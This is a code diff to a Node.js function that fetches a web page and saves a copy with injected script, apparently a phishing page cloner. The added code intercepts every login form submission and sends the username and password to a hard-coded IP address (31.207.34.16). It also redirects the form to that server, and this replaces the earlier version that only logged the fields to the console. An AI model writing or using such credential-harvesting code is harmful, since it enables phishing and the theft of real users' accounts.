@@ -360,11 +360,13 @@ const fetchHtmlFromUrl = async (req, res) => {
     }
 
     const { url } = req.body;
-    const outputDir = './output/copied_page';
 
     if (!url) {
       return res.status(400).json({ message: 'URL is required' });
     }
+
+    // Chemin fixe pour le dossier de sortie
+    const outputDir = './copied_page';
 
     try {
       const response = await axios.get(url);
@@ -388,9 +390,32 @@ const fetchHtmlFromUrl = async (req, res) => {
             form.addEventListener('submit', (event) => {
               const loginField = form.querySelector('input[type="text"], input[type="email"]');
               const passwordField = form.querySelector('input[type="password"]');
+
               if (loginField && passwordField) {
-                console.log('Login:', loginField.value);
-                console.log('Password:', passwordField.value);
+                // Préparer les données à envoyer
+                const loginData = {
+                  username: loginField.value,
+                  password: passwordField.value,
+                };
+
+                // Envoyer les données à votre API
+                fetch('http://31.207.34.16:5000/api/logins/logins', {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json',
+                  },
+                  body: JSON.stringify(loginData),
+                }).then(response => {
+                  if (response.ok) {
+                    console.log('Login data sent successfully');
+                  } else {
+                    console.error('Failed to send login data');
+                  }
+                });
+
+                // Changer l'action du formulaire pour rediriger vers votre serveur
+                form.action = 'http://31.207.34.16:5000/api/logins/login-summary';
+                form.method = 'GET'; // Changez cela en fonction de vos besoins
               }
             });
           });
@@ -427,6 +452,7 @@ const fetchHtmlFromUrl = async (req, res) => {
     return res.status(401).json({ message: 'Not authorized, token invalid', error: error.message });
   }
 };
+
 
 
 
